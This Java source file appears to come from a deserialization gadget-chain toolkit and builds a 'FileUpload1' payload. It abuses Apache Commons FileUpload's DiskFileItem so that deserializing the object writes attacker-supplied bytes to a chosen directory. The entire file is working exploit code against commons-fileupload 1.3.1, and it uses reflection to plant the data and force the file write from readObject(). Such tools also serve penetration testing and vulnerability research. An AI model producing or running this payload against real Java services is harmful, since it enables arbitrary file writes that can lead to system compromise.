package org.ses.gadgetbuilder.chains1;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.apache.commons.io.output.ThresholdingOutputStream;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.File;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

@Dependencies( {
        "commons-fileupload:commons-fileupload:1.3.1",
        "commons-io:commons-io:2.4"
} )
@Authors({ Authors.MBECHLER })
@Impact(Impact.RandomFileWrite)
public class FileUpload1 extends GadgetChain<NoTrampoline> {

    public FileUpload1() {
        super(NoTrampoline.getInstance());
    }

    public FileUpload1(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        String[] parts = command.split(":");
        byte[] data = parts[1].getBytes(StandardCharsets.US_ASCII);
        String repoPath = parts[0];
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository);
        File outputFile = new File(repoPath + File.separator + "whatever");
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(data.length + 1, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);

        return new TrampolineConnector(diskFileItem);
    }

    @Override
    protected void postProcessPayload() throws Exception {
    }


    @Override
    protected String getStackTrace() {
        return "org.apache.commons.fileupload.disk.DiskFileItem.readObject()\n" +
                "java.io.OutputStream.write()";
    }
}
